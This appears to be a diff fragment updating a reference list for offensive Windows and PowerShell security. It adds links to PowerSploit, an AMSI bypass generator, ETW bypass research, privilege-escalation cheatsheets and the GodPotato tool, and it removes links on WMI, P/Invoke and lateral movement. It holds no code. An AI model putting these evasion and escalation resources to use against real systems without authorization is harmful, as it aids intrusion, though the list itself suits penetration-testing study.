-- [WMI for Offense, Defense, and Forensics — FireEye/Mandiant](https://www.mandiant.com/resources/blog/wmi-offense-defense-forensics)
-- [pinvoke.net — P/Invoke Signatures](http://pinvoke.net/)
-- [ired.team — Lateral Movement](https://www.ired.team/offensive-security/lateral-movement)
+- [PowerShell Documentation — Microsoft Learn](https://learn.microsoft.com/en-us/powershell/)
+- [AMSI Developer Documentation — Microsoft](https://learn.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal)
+- [PayloadsAllTheThings — PowerShell Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Powershell%20-%20Cheatsheet.md)
+- [PowerSploit — PowerShellMafia](https://github.com/PowerShellMafia/PowerSploit)
+- [AMSI.fail — Bypass Generator](https://amsi.fail/)
+- [ETW Bypass Research — xpn.sec](https://blog.xpnsec.com/hiding-your-dotnet-etw/)
+- [PrivescCheck — itm4n](https://github.com/itm4n/PrivescCheck)
+- [Windows Privilege Escalation — PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
+- [GodPotato — Potato Attacks](https://github.com/BeichenDream/GodPotato)
